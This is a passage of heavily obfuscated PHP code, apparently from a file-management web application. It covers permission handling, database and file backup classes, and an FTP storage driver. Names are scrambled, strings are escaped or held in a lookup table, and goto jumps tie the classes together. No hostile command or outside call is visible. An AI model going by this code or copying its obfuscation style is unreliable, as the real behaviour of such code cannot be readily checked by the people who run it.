($½¹­š× as $ò ¾¯ë‚) { if ($ßÃÒ°Şè & $ò ¾¯ë‚) { $Œåòï ¿[] = $ò ¾¯ë‚; } } if (in_array(self::AUTH_ROOT, $Œåòï ¿)) { $ßÃÒ°Şè = array_sum($½¹­š×); return; } $ôÑ²ãÌŒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Œåòï ¿ as $ò ¾¯ë‚) { if (isset($ôÑ²ãÌŒ[$ò ¾¯ë‚])) { $Œåòï ¿ = array_merge($Œåòï ¿, $ôÑ²ãÌŒ[$ò ¾¯ë‚]); } } $Œåòï ¿[] = self::AUTH_SHOW; $ßÃÒ°Şè = array_sum(array_unique($Œåòï ¿)); } public function sort($ìñàçìÏ, $õ¸÷½°°) { return parent::update($ìñàçìÏ, $õ¸÷½°°); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\142\141\x63\x6b\165\160\x4c\x69\x73\164"; public $field = array("\151\x6f", "\x6e\141\x6d\x65", "\x73\x74\x61\164\x75\x73", "\x63\x6f\x6e\x74\145\156\x74", "\x6d\141\x6e\x75\x61\154", "\162\x65\x73\165\x6c\164", "\x74\x69\155\145\106\x72\x6f\x6d", "\x74\151\155\145\124\157"); public function config() { $úÄÚ´ó¡ =& $_SERVER[±³—úê]; Action($úÄÚ´ó¡[2000])->taskInit(); $²ù’Üö´ = Model($úÄÚ´ó¡[850])->get($úÄÚ´ó¡[864]); $²ù’Üö´ = json_decode($²ù’Üö´, !0); $²ù’Üö´ = is_array($²ù’Üö´) ? $²ù’Üö´ : array(); $this->parseContent($²ù’Üö´); unset($²ù’Üö´[$úÄÚ´ó¡[1744]]); Model($úÄÚ´ó¡[1743])->cacheClear(); $¬±Í§ç¹ = $úÄÚ´ó¡[2001]; $¡ŒŞ©Øæ = Model($úÄÚ´ó¡[2002])->findByKey($úÄÚ´ó¡[1762], $¬±Í§ç¹); if (!$¡ŒŞ©Øæ) { $¡ŒŞ©Øæ = array(); } if (isset($¡ŒŞ©Øæ[$úÄÚ´ó¡[206]])) { $¡ŒŞ©Øæ[$úÄÚ´ó¡[206]] = json_decode($¡ŒŞ©Øæ[$úÄÚ´ó¡[206]], !0); } if (isset($²ù’Üö´[$úÄÚ´ó¡[206]])) { $¡ŒŞ©Øæ[$úÄÚ´ó¡[206]][$úÄÚ´ó¡[1747]] = $²ù’Üö´[$úÄÚ´ó¡[206]]; unset($²ù’Üö´[$úÄÚ´ó¡[206]]); } return array_merge($¡ŒŞ©Øæ, $²ù’Üö´); } public function listData($ç™õ«‡ = false, $¿”œ©£§ = "\155\157\144\x69\146\x79\124\151\155\x65", $¯Û°Íûİ = false) { $­¸Óù€ = parent::listData($ç™õ«‡, $¿”œ©£§, !0); if (!$­¸Óù€) { return $­¸Óù€; } if ($ç™õ«‡) { $­¸Óù€ = array($­¸Óù€); } foreach ($­¸Óù€ as &$Â´ì‹Ï˜) { $this->parseContent($Â´ì‹Ï˜); } return $ç™õ«‡ ? $­¸Óù€[0] : $­¸Óù€; } public function parseContent(&$‘‚ÆÂ) { $Ê«§ =& $_SERVER[±³—úê]; $Ü½Åª›´ = _get($‘‚ÆÂ, $Ê«§[171], $Ê«§[91]); if (!in_array($Ü½Åª›´, array($Ê«§[856], $Ê«§[1211]))) { $‘‚ÆÂ[$Ê«§[171]] = $Ü½Åª›´ == $Ê«§[91] ? $Ê«§[1211] : $Ê«§[856]; } } public function lastItem() { $€ûîÎÏô = $this->listData(); return !empty($€ûîÎÏô[0]) ? $€ûîÎÏô[0] : null; } public function kill($“ÅäÑ¯) { $¤»†ğ‹ =& $_SERVER[±³—úê]; $ËõÍ»‘« = $this->listData($“ÅäÑ¯); if (!$ËõÍ»‘« || empty($ËõÍ»‘«[$¤»†ğ‹[32]])) { return !0; } Task::kill($¤»†ğ‹[863]); Task::kill($¤»†ğ‹[881]); Task::kill($¤»†ğ‹[890]); $·½¥¡‹â = $ËõÍ»‘«[$¤»†ğ‹[32]]; $şÆ®û› = TEMP_FILES . $¤»†ğ‹[859] . $·½¥¡‹â . $¤»†ğ‹[8]; IO::remove($şÆ®û›, !1); return $this->remove($“ÅäÑ¯); } public function remove($µËÀòá½) { $€à‘êøò = $this->listData($µËÀòá½); if (!$€à‘êøò) { return !0; } return $this->backupRemove($€à‘êøò); } private function backupRemove($ÊàÂáè¸) { parent::remove($ÊàÂáè¸[$_SERVER[±³—úê][486]]); $‘ÉŠ¦Ò” = $this->backupPath($ÊàÂáè¸); IO::remove($‘ÉŠ¦Ò”, !1); return !0; } private function backupPath($¿«íÉ³«) { $Î¶Ÿæı› =& $_SERVER[±³—úê]; $í¬ï®ùó = $¿«íÉ³«[$Î¶Ÿæı›[32]]; $£Ó­áÊô = Model($Î¶Ÿæı›[850])->get($Î¶Ÿæı›[851]); $Ç¢ë›·ß = substr(md5($Î¶Ÿæı›[852] . $£Ó­áÊô . $í¬ï®ùó), 0, 8); return "\x7b\x69\x6f\x3a{$¿«íÉ³«[$Î¶Ÿæı›[832]]}\175\x2f\x64\x61\x74\141\x62\141\x73\x65\57\142\141\143\153\x75\160\x2f" . $í¬ï®ùó . $Î¶Ÿæı›[11] . $Ç¢ë›·ß; } public function start() { $èìÄ¹æ =& $_SERVER[±³—úê]; if ($GLOBALS[$èìÄ¹æ[6]][$èìÄ¹æ[92]][$èìÄ¹æ[2003]] != $èìÄ¹æ[91]) { return !0; } $œÃØ®û¢ = $this->config(); if (!$œÃØ®û¢ || $œÃØ®û¢[$èìÄ¹æ[1744]] != $èìÄ¹æ[91]) { return !1; } if ($œÃØ®û¢[$èìÄ¹æ[171]] == $èìÄ¹æ[856]) { $öôµÑÔ = Model($èìÄ¹æ[850])->get($èìÄ¹æ[1326]); if ($öôµÑÔ == $èìÄ¹æ[1327]) { $œÃØ®û¢[$èìÄ¹æ[171]] = $èìÄ¹æ[1211]; } } $ÍØàã¶° = $this->process(); foreach ($ÍØàã¶° as $î—´‡”Ì) { if ($î—´‡”Ì) { return Task::restart($î—´‡”Ì[$èìÄ¹æ[486]]); } } $üõğşî = new Backup(); $„—ĞÒ…Ü = $üõğşî->db(); if ($„—ĞÒ…Ü) { $„—ĞÒ…Ü = $üõğşî->dbFile(); if ($„—ĞÒ…Ü && $œÃØ®û¢[$èìÄ¹æ[171]] == $èìÄ¹æ[856]) { $„—ĞÒ…Ü = $üõğşî->file(); } } Backup::set(array($èìÄ¹æ[830] => 1, $èìÄ¹æ[841] => time())); return !0; } public function process() { $Á÷··öß =& $_SERVER[±³—úê]; $§Ù­ÂÇ¡ = array($Á÷··öß[837] => Task::get($Á÷··öß[863]), $Á÷··öß[842] => Task::get($Á÷··öß[881]), $Á÷··öß[242] => Task::get($Á÷··öß[890])); $¯¥é£€‚ = !1; foreach ($§Ù­ÂÇ¡ as &$•çµîÇÚ) { if ($¯¥é£€‚) { $•çµîÇÚ = !1; continue; } if ($•çµîÇÚ) { $Œøà¯˜ñ = intval(_get($•çµîÇÚ, $Á÷··öß[1780], 0)); if (time() - $Œøà¯˜ñ > 7200) { Task::kill($•çµîÇÚ[$Á÷··öß[486]]); $¯¥é£€‚ = !0; $•çµîÇÚ = !1; } } } return $§Ù­ÂÇ¡; } public function restore() { $¢òğîÉ =& $_SERVER[±³—úê]; ActionCall($¢òğîÉ[1139], !0, 1); ActionCall($¢òğîÉ[1139], !0, 0); } } goto eÃ¯¼¤ÖÎ; e†Û¥„°¯‚: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Œ§ëµÊ‡ =& $_SERVER[±³—úê]; $ªœ›ËÒ = Backup::get(); self::$io = $ªœ›ËÒ[$Œ§ëµÊ‡[832]]; self::$name = $ªœ›ËÒ[$Œ§ëµÊ‡[32]]; $¬É–İûš = new DbManage(); $ËÌÛÉ‰Î = $¬É–İûš->dbType(); $áø´òş = array($Œ§ëµÊ‡[857] => $ËÌÛÉ‰Î, $Œ§ëµÊ‡[858] => time()); Backup::set($áø´òş); $“¿ÕøÙª = $this->tmpFilesPath() . $Œ§ëµÊ‡[859] . self::$name . $Œ§ëµÊ‡[8]; del_dir($“¿ÕøÙª); mk_dir($“¿ÕøÙª); $°î…ôœŒ = $¨Ğù‘¯ä = 0; try { $ÕÀãˆ  = $¬É–İûš->db()->getTables(); } catch (Exception $ÙÓˆÏÙ¦) { return !1; } $ÕÀãˆ  = array_diff($ÕÀãˆ , array($Œ§ëµÊ‡[860], $Œ§ëµÊ‡[861])); foreach ($ÕÀãˆ  as $ä£Ã¶„Ù) { if ($ä£Ã¶„Ù == $Œ§ëµÊ‡[862]) { continue; } $°î…ôœŒ += $¬É–İûš->model($ä£Ã¶„Ù)->count(); } $æ¹—¦ú€ = new Task($Œ§ëµÊ‡[863], $Œ§ëµÊ‡[864], $°î…ôœŒ, LNG($Œ§ëµÊ‡[865]) . $Œ§ëµÊ‡[866] . LNG($Œ§ëµÊ‡[867])); $GLOBALS[$Œ§ëµÊ‡[868]] = self::$name; foreach ($ÕÀãˆ  as $ä£Ã¶„Ù) { $©á×Î¤÷ = $“¿ÕøÙª . $ä£Ã¶„Ù . $Œ§ëµÊ‡[869]; if ($ä£Ã¶„Ù == $Œ§ëµÊ‡[862]) { @touch($©á×Î¤÷); continue; } $áëï ùï = null; if ($ä£Ã¶„Ù == $Œ§ëµÊ‡[870] && $ªœ›ËÒ[$Œ§ëµÊ‡[171]] == $Œ§ëµÊ‡[856]) { $áëï ùï = self::$io; } $¨Ğù‘¯ä += $¬É–İûš->sqlFromDb($ä£Ã¶„Ù, $©á×Î¤÷, $æ¹—¦ú€, $áëï ùï); } unset($GLOBALS[$Œ§ëµÊ‡[868]]); $æ¹—¦ú€->end(); if ($¨Ğù‘¯ä > $°î…ôœŒ) { $°î…ôœŒ = $¨Ğù‘¯ä; } $áø´òş = array($Œ§ëµÊ‡[857] => $ËÌÛÉ‰Î, $Œ§ëµÊ‡[853] => 1, $Œ§ëµÊ‡[871] => $°î…ôœŒ, $Œ§ëµÊ‡[872] => $¨Ğù‘¯ä, $Œ§ëµÊ‡[873] => time()); Backup::set($áø´òş); if ($°î…ôœŒ - $¨Ğù‘¯ä > 0) { $¨šöØÆ = $Œ§ëµÊ‡[874]; if (!stristr(I18n::getType(), $Œ§ëµÊ‡[875])) { $¨šöØÆ = $Œ§ëµÊ‡[876]; } write_log(array($¨šöØÆ, $áø´òş), $Œ§ëµÊ‡[864]); return !1; } return !0; } private function tmpFilesPath() { $¶Ş–ãØ˜ =& $_SERVER[±³—úê]; $ş¿çÍ›± = TEMP_FILES; if ($GLOBALS[$¶Ş–ãØ˜[6]][$¶Ş–ãØ˜[92]][$¶Ş–ãØ˜[877]]) { $ş¿çÍ›± = $GLOBALS[$¶Ş–ãØ˜[6]][$¶Ş–ãØ˜[92]][$¶Ş–ãØ˜[877]]; if (!mk_dir($ş¿çÍ›±) || !is_writable($ş¿çÍ›±) || !IO::mkfile($ş¿çÍ›± . $¶Ş–ãØ˜[878])) { $ş¿çÍ›± = TEMP_FILES; } } return $ş¿çÍ›±; } } class BackupDbFile { public function __construct() { } public function index() { $×·ÑÇŒ =& $_SERVER[±³—úê]; $ì…îÛ× = Backup::get(); $â‡ñ¡ï‡ = $ì…îÛ×[$×·ÑÇŒ[32]]; $±˜ê”» = $this->tmpFilesPath() . "\142\x61\x63\153\165\160\137{$â‡ñ¡ï‡}\57"; $½ôã±ûè = $this->backupPath($ì…îÛ×); if (!($½ôã±ûè = IO::mkdir($½ôã±ûè))) { return !1; } $¢æĞß÷‹ = IO::listPath($±˜ê”»); $€Á¡šò¶ = isset($¢æĞß÷‹[$×·ÑÇŒ[86]]) ? $¢æĞß÷‹[$×·ÑÇŒ[86]] : array(); $üÌÖ»¸ë = array_sum(array_column($€Á¡šò¶, $×·ÑÇŒ[79])); if (!$üÌÖ»¸ë) { return !1; } $ãõı™§ô = array($×·ÑÇŒ[879] => $üÌÖ»¸ë, $×·ÑÇŒ[880] => time()); Backup::set($ãõı™§ô); $ø½å“íê = new TaskFileTransfer($×·ÑÇŒ[881], $×·ÑÇŒ[864], count($€Á¡šò¶), LNG($×·ÑÇŒ[865]) . $×·ÑÇŒ[473] . LNG($×·ÑÇŒ[867]) . $×·ÑÇŒ[882]); $ø½å“íê->task[$×·ÑÇŒ[843]] = $üÌÖ»¸ë; foreach ($¢æĞß÷‹[$×·ÑÇŒ[86]] as $ó‰ˆ¯ğû) { $€ÊêïÀ = IO::move($ó‰ˆ¯ğû[$×·ÑÇŒ[87]], $½ôã±ûè); if (!$€ÊêïÀ) { $ø½å“íê->end(); $ÚÈ¥ò÷ = IO::getLastError($×·ÑÇŒ[883] . $ó‰ˆ¯ğû[$×·ÑÇŒ[87]] . $×·ÑÇŒ[884] . $½ôã±ûè . $×·ÑÇŒ[178]); write_log($ÚÈ¥ò÷, $×·ÑÇŒ[864]); return !1; } } $ªöÜç´¿ = new DbManage(); $¹€ûâÛç = $ªöÜç´¿->getSqlFile(); if (!$¹€ûâÛç[$×·ÑÇŒ[885]] || !$¹€ûâÛç[$×·ÑÇŒ[13]]) { return !1; } IO::move($¹€ûâÛç[$×·ÑÇŒ[885]], $½ôã±ûè); IO::move($¹€ûâÛç[$×·ÑÇŒ[13]], $½ôã±ûè); $ø½å“íê->end(); $ãõı™§ô = array($×·ÑÇŒ[886] => $üÌÖ»¸ë, $×·ÑÇŒ[887] => time()); Backup::set($ãõı™§ô); return !0; } private function backupPath($‹½©ÂÕ€) { $æã’¡Í =& $_SERVER[±³—úê]; $€ˆ‚áä = $‹½©ÂÕ€[$æã’¡Í[32]]; $¸Êª—ü = Model($æã’¡Í[850])->get($æã’¡Í[851]); $Ş•š€ƒµ = substr(md5($æã’¡Í[852] . $¸Êª—ü . $€ˆ‚áä), 0, 8); return "\173\x69\157\72{$‹½©ÂÕ€[$æã’¡Í[832]]}\175\57\144\141\164\141\142\x61\163\x65\57\x62\x61\143\153\x75\x70\x2f" . $€ˆ‚áä . $æã’¡Í[11] . $Ş•š€ƒµ; } private function tmpFilesPath() { $úÍûñ =& $_SERVER[±³—úê]; $Ÿ°ş£¯¡ = TEMP_FILES; if ($GLOBALS[$úÍûñ[6]][$úÍûñ[92]][$úÍûñ[877]]) { $Ÿ°ş£¯¡ = $GLOBALS[$úÍûñ[6]][$úÍûñ[92]][$úÍûñ[877]]; if (!mk_dir($Ÿ°ş£¯¡) || !is_writable($Ÿ°ş£¯¡) || !IO::mkfile($Ÿ°ş£¯¡ . $úÍûñ[878])) { $Ÿ°ş£¯¡ = TEMP_FILES; } } return $Ÿ°ş£¯¡; } } class BackupFile { public function __construct() { } public function index() { $®Ê™ = Backup::get(); $°¨µË¤‰ = $®Ê™[$_SERVER[±³—úê][379]][$_SERVER[±³—úê][242]][$_SERVER[±³—úê][552]]; $·ÅëàÑÔ = array($_SERVER[±³—úê][553] => array($_SERVER[±³—úê][888], $°¨µË¤‰), $_SERVER[±³—úê][889] => array($_SERVER[±³—úê][417], $®Ê™[$_SERVER[±³—úê][832]])); $ùğŠ®òÖ = (int) Model($_SERVER[±³—úê][870])->where($·ÅëàÑÔ)->count($_SERVER[±³—úê][552]); $Èõ¨ÛÊ¾ = (int) Model($_SERVER[±³—úê][870])->where($·ÅëàÑÔ)->sum($_SERVER[±³—úê][79]); $ÁÃ×ïÍ = new TaskFileTransfer($_SERVER[±³—úê][890], $_SERVER[±³—úê][864], $ùğŠ®òÖ, LNG($_SERVER[±³—úê][865]) . $_SERVER[±³—úê][866] . LNG($_SERVER[±³—úê][891])); $ÁÃ×ïÍ->task[$_SERVER[±³—úê][843]] = $Èõ¨ÛÊ¾; $Ğ‘ã¶¥  = array($_SERVER[±³—úê][892] => $ùğŠ®òÖ, $_SERVER[±³—úê][893] => $Èõ¨ÛÊ¾, $_SERVER[±³—úê][894] => time()); Backup::set($Ğ‘ã¶¥ ); $Í‰Ñßçû = !0; $Àµ˜–“ = $this->storeIds(); $‚¤ù®Æ = 1; $‘ƒğù²š = 1000; $›Ô†Á“ = $šù¦áã = 0; $Š´­„ƒ½ = array(); $Õ„ËÃúŠ = $£Õƒß®½ = 0; do { $·¾á”´• = $_SERVER[±³—úê][895]; $çÃëÎ±è = Model($_SERVER[±³—úê][870])->where($·ÅëàÑÔ)->field($·¾á”´•)->order($_SERVER[±³—úê][896])->selectPage($‘ƒğù²š, $‚¤ù®Æ); $ıš¦â‹ = !empty($çÃëÎ±è[$_SERVER[±³—úê][456]]) ? $çÃëÎ±è[$_SERVER[±³—úê][456]] : array(); foreach ($ıš¦â‹ as $ûã±¼¾é) { if (!$this->_fileExist($ûã±¼¾é, $Š´­„ƒ½, $Àµ˜–“)) { write_log("\146\151\154\145\x20\x6e\157\x74\x20\145\x78\x69\x73\x74\56\146\x69\154\145\x49\x44\x3a{$ûã±¼¾é[$_SERVER[±³—úê][552]]}\54\x20\160\141\164\x68\x3a{$ûã±¼¾é[$_SERVER[±³—úê][87]]}", $_SERVER[±³—úê][897]); continue; } $¨¡™›øÕ = $ûã±¼¾é[$_SERVER[±³—úê][87]]; $¡®¥’ê = "\173\151\x6f\72{$®Ê™[$_SERVER[±³—úê][832]]}\175" . substr($¨¡™›øÕ, strlen("\173\x69\x6f\x3a{$ûã±¼¾é[$_SERVER[±³—úê][898]]}\175")); if (IO::exist($¡®¥’ê)) { $ÁÃ×ïÍ->updateFileEnd($ûã±¼¾é[$_SERVER[±³—úê][32]], $ûã±¼¾é[$_SERVER[±³—úê][79]]); } else { $¡®¥’ê = get_path_father($¡®¥’ê); IO::mkdir($¡®¥’ê); if (!IO::copy($¨¡™›øÕ, $¡®¥’ê, $_SERVER[±³—úê][899])) { write_log($_SERVER[±³—úê][900] . $¨¡™›øÕ . $_SERVER[±³—úê][884] . $¡®¥’ê . $_SERVER[±³—úê][178], $_SERVER[±³—úê][864]); $Í‰Ñßçû = !1; break; } } $°¨µË¤‰ = $ûã±¼¾é[$_SERVER[±³—úê][552]]; $šù¦áã += 1; $›Ô†Á“ += $ûã±¼¾é[$_SERVER[±³—úê][79]]; $£Õƒß®½ += 1; $Õ„ËÃúŠ += $ûã±¼¾é[$_SERVER[±³—úê][79]]; if ($›Ô†Á“ >= 1024 * 1024 * 100) { $Ğ‘ã¶¥  = array($_SERVER[±³—úê][831] => $°¨µË¤‰, $_SERVER[±³—úê][901] => $£Õƒß®½, $_SERVER[±³—úê][902] => $Õ„ËÃúŠ); Backup::set($Ğ‘ã¶¥ ); $›Ô†Á“ = $šù¦áã = 0; } } $ê ÄÉÌš = count($ıš¦â‹); $‚¤ù®Æ++; } while ($ê ÄÉÌš == $‘ƒğù²š); $ÁÃ×ïÍ->end(); $Ğ‘ã¶¥  = array($_SERVER[±³—úê][903] => 1, $_SERVER[±³—úê][841] => time(), $_SERVER[±³—úê][855] => 1, $_SERVER[±³—úê][831] => $°¨µË¤‰, $_SERVER[±³—úê][904] => time()); if ($šù¦áã) { $Ğ‘ã¶¥ [$_SERVER[±³—úê][901]] = $£Õƒß®½; $Ğ‘ã¶¥ [$_SERVER[±³—úê][902]] = $Õ„ËÃúŠ; } Backup::set($Ğ‘ã¶¥ ); return !0; } private function _fileExist($é¡ÓÛù, &$”—Êâ·¦, $úùÛœğ) { $œ‡úŞ³’ =& $_SERVER[±³—úê]; $¿»’­…Ë = $é¡ÓÛù[$œ‡úŞ³’[87]]; if (in_array($é¡ÓÛù[$œ‡úŞ³’[552]], $”—Êâ·¦)) { return !1; } if (!in_array($é¡ÓÛù[$œ‡úŞ³’[898]], $úùÛœğ)) { return !1; } if (IO::exist($¿»’­…Ë)) { return !0; } $–òª¾ùÆ = get_path_father($¿»’­…Ë); if (IO::exist($–òª¾ùÆ)) { $”—Êâ·¦[] = $é¡ÓÛù[$œ‡úŞ³’[552]]; return !1; } $¶Ì™˜™ö = array($œ‡úŞ³’[898] => $é¡ÓÛù[$œ‡úŞ³’[898]], $œ‡úŞ³’[87] => array($œ‡úŞ³’[470], "{$–òª¾ùÆ}\x25")); $àËŠÜíë = Model($œ‡úŞ³’[870])->where($¶Ì™˜™ö)->field($œ‡úŞ³’[553])->select(); $”—Êâ·¦ = array_merge($”—Êâ·¦, array_to_keyvalue($àËŠÜíë, $œ‡úŞ³’[12], $œ‡úŞ³’[552])); return !1; } private function _fileFilter($ÁäŸ×ıÎ) { $şÔÇ«– =& $_SERVER[±³—úê]; return; if (empty($ÁäŸ×ıÎ)) { return; } $¥¡İ¶Â³ = array($şÔÇ«–[552] => array($şÔÇ«–[7], array_unique($ÁäŸ×ıÎ))); $ë¢˜ùää = Model($şÔÇ«–[905])->where($¥¡İ¶Â³)->field($şÔÇ«–[193])->select(); foreach ($ë¢˜ùää as $ô£ÅÜèÄ) { Model($şÔÇ«–[905])->remove($ô£ÅÜèÄ[$şÔÇ«–[193]], !1); } } private function storeIds() { $¸Í¹æ ç =& $_SERVER[±³—úê]; $ÍÄ˜ˆ­ä = Model($¸Í¹æ ç[847])->listData(); $¹Ì¸¯“£ = array(); $öĞ€×˜¦ = $GLOBALS[$¸Í¹æ ç[6]][$¸Í¹æ ç[92]][$¸Í¹æ ç[906]]; foreach ($ÍÄ˜ˆ­ä as $Õâ¬ı·Ñ) { $ïƒè—æ = strtolower($Õâ¬ı·Ñ[$¸Í¹æ ç[98]]); if (!isset($öĞ€×˜¦[$ïƒè—æ])) { continue; } $Ëı°™â = $¸Í¹æ ç[77] . (isset($öĞ€×˜¦[$ïƒè—æ]) ? $öĞ€×˜¦[$ïƒè—æ] : ucfirst($ïƒè—æ)); if (!class_exists($Ëı°™â)) { continue; } $¹Ì¸¯“£[] = $Õâ¬ı·Ñ[$¸Í¹æ ç[486]]; } return $¹Ì¸¯“£; } } goto F®×İÜ”Ï; Cï–¹–ŸŠé: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ø†™‚·) { parent::__construct(); if (count($ø†™‚·) > 0) { $this->_init($ø†™‚·); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¤ì±¯¼) { $îí¬†°Ç =& $_SERVER[±³—úê]; global $config; $this->appCharset = $config[$îí¬†°Ç[1441]]; $this->systemCharset = $config[$îí¬†°Ç[1442]]; if (isset($¤ì±¯¼[$îí¬†°Ç[1443]]) && $¤ì±¯¼[$îí¬†°Ç[1443]]) { $this->systemCharset = $¤ì±¯¼[$îí¬†°Ç[1443]]; } } public function iconvApp($Ç³ã“¡é) { return $this->iconvTo($Ç³ã“¡é, $this->systemCharset, $this->appCharset); } public function iconvSystem($®‡Ÿçá×) { return $this->iconvTo($®‡Ÿçá×, $this->appCharset, $this->systemCharset); } public function getPathOuter($ö¤ãÄÍÄ) { $Ş±â†…  =& $_SERVER[±³—úê]; $–ùÇ¼¿ = $this->iconvApp($this->pathBase); $ö¤ãÄÍÄ = $this->iconvApp($ö¤ãÄÍÄ); if (substr($–ùÇ¼¿, 0, 2) == $Ş±â†… [1413]) { $–ùÇ¼¿ = BASIC_PATH . substr($–ùÇ¼¿, 2); } if (substr($ö¤ãÄÍÄ, 0, 2) == $Ş±â†… [1413]) { $ö¤ãÄÍÄ = BASIC_PATH . substr($ö¤ãÄÍÄ, 2); } $–ùÇ¼¿ = KodIO::clear($–ùÇ¼¿); $ö¤ãÄÍÄ = KodIO::clear($ö¤ãÄÍÄ); $ö¤ãÄÍÄ = substr($ö¤ãÄÍÄ, strlen($–ùÇ¼¿)); if (empty($this->pathDriver)) { return $ö¤ãÄÍÄ; } return $this->pathDriver . $Ş±â†… [8] . ltrim($ö¤ãÄÍÄ, $Ş±â†… [8]); } private function _init($¯Î–‚Í­ = array()) { $œ±şÎíŠ =& $_SERVER[±³—úê]; if (!function_exists($œ±şÎíŠ[1444])) { throw new Exception(LNG($œ±şÎíŠ[1445])); } $this->config = $¯Î–‚Í­; $this->charsetReset($¯Î–‚Í­); foreach ($¯Î–‚Í­ as $¨»ºş“” => $“­ÉÃ¿ø) { if (isset($this->{$¨»ºş“”})) { $this->{$¨»ºş“”} = $“­ÉÃ¿ø; } } return $this->_login($¯Î–‚Í­); } private function _login($ûŒ˜’Á) { $ ÑÀøÃİ =& $_SERVER[±³—úê]; static $ŸÖ•ÜĞ¤ = array(); $ÏÏ¸£˜ = md5(json_encode($ûŒ˜’Á)); if (isset($ŸÖ•ÜĞ¤[$ÏÏ¸£˜])) { foreach ($ŸÖ•ÜĞ¤[$ÏÏ¸£˜] as $ªùØØ·İ => $¯ÂÛİäÄ) { $this->{$ªùØØ·İ} = $¯ÂÛİäÄ; } return !0; } $©ùŠĞÁ“ = parse_url(trim($this->server, $ ÑÀøÃİ[8])); $this->host = $©ùŠĞÁ“[$ ÑÀøÃİ[208]]; $ßäò”Ëã = isset($©ùŠĞÁ“[$ ÑÀøÃİ[207]]) && $©ùŠĞÁ“[$ ÑÀøÃİ[207]] == $ ÑÀøÃİ[1446] ? !0 : !1; $this->scheme = $ßäò”Ëã ? $ ÑÀøÃİ[1447] : $ ÑÀøÃİ[1448]; $this->port = isset($©ùŠĞÁ“[$ ÑÀøÃİ[209]]) ? $©ùŠĞÁ“[$ ÑÀøÃİ[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ ÑÀøÃİ[1449]) . $this->host . $ ÑÀøÃİ[4] . $this->port, !0); return !1; } $Ş›ºõ‰Œ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Ş›ºõ‰Œ) { $this->writeLog(LNG($ ÑÀøÃİ[1450]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $˜íáœ×Ï = $this->pasv == $ ÑÀøÃİ[91] ? !0 : !1; @ftp_pasv($this->connect, $˜íáœ×Ï); $ŸÖ•ÜĞ¤[$ÏÏ¸£˜] = array($ ÑÀøÃİ[1451] => $this->connect, $ ÑÀøÃİ[208] => $this->host, $ ÑÀøÃİ[207] => $this->scheme, $ ÑÀøÃİ[209] => $this->port); return $Ş›ºõ‰Œ; } private function _isconn($ÈŠĞ ¥ñ = true) { if (is_resource($this->connect)) { return !0; } if (!$ÈŠĞ ¥ñ) { return !1; } return $this->_login($this->config); } public function mkfile($ó·è“«Â, $¹áëšëø = '', $ş¨ÑŠóÍ = REPEAT_RENAME) { if ($this->setContent($ó·è“«Â, $¹áëšëø)) { return $this->getPathOuter($ó·è“«Â); } $this->writeLog(LNG($_SERVER[±³—úê][1452]), !0); return !1; } public function mkdir($ı‘Çõ¬Ş, $ˆ†ôµ‡Ì = REPEAT_SKIP) { $¤ÌÚÏúı =& $_SERVER[±³—úê]; if (!$ı‘Çõ¬Ş || $ı‘Çõ¬Ş == $¤ÌÚÏúı[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ı‘Çõ¬Ş = $this->iconvSystem($ı‘Çõ¬Ş); if ($this->_isFolder($ı‘Çõ¬Ş) || @ftp_mkdir($this->connect, $ı‘Çõ¬Ş)) { return $this->getPathOuter($ı‘Çõ¬Ş); } if (!$this->mkdir($this->pathFather($ı‘Çõ¬Ş))) { return !1; } if ($ı‘Çõ¬Ş = @ftp_mkdir($this->connect, $ı‘Çõ¬Ş)) { return $this->getPathOuter($ı‘Çõ¬Ş); } $this->writeLog(__FUNCTION__ . $¤ÌÚÏúı[1453], !0); return !1; } public function copyFile($èÛ›¡¢ö, $¾èı şŞ) { if (!$this->_isconn()) { return !1; } $î¹­²¹¹ = $this->pathThis($this->iconvSystem($èÛ›¡¢ö)); $ÁºáÌÎ¿ = $this->tempFile($î¹­²¹¹); $ÄÉàóŒÃ = $this->iconvApp($ÁºáÌÎ¿); $this->download($èÛ›¡¢ö, $ÄÉàóŒÃ); $åÉ•÷àÉ = $this->upload($¾èı şŞ, $ÄÉàóŒÃ); $this->tempFileRemve($ÁºáÌÎ¿); return $åÉ•÷àÉ; } public function moveFile($×Ğ€‘ÙÂ, $”ü™†¢€) { if (!$this->_isconn()) { return !1; } $×Ğ€‘ÙÂ = $this->iconvSystem($×Ğ€‘ÙÂ); $”ü™†¢€ = $this->iconvSystem($”ü™†¢€); $ùÅ®¤ª = @ftp_rename($this->connect, $×Ğ€‘ÙÂ, $”ü™†¢€); if (!$ùÅ®¤ª) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } return $this->getPathOuter($”ü™†¢€); } public function delFile($Ï–¤÷Õ«) { if (!$this->_isconn()) { return !1; } $Ï–¤÷Õ« = $this->iconvSystem($Ï–¤÷Õ«); $õ°ıæŠ = @ftp_delete($this->connect, $Ï–¤÷Õ«); if (!$õ°ıæŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); } return $õ°ıæŠ; } public function delFolder($¡ªĞ•¾) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $›„³ı´ = $¨æ•ò¦– = array(); $this->fileList($¡ªĞ•¾, $›„³ı´, $¨æ•ò¦–, !0); $this->listItemCache = !0; foreach ($¨æ•ò¦– as $¦õæ¯Ë¢) { $É¨»Ôú = $this->iconvSystem($¦õæ¯Ë¢[$_SERVER[±³—úê][32]]); $Ó´ƒÀÎŸ = @ftp_delete($this->connect, $É¨»Ôú); if (!$Ó´ƒÀÎŸ) { return !1; } } foreach ($›„³ı´ as $É¨»Ôú) { $É¨»Ôú = $this->iconvSystem($É¨»Ôú); 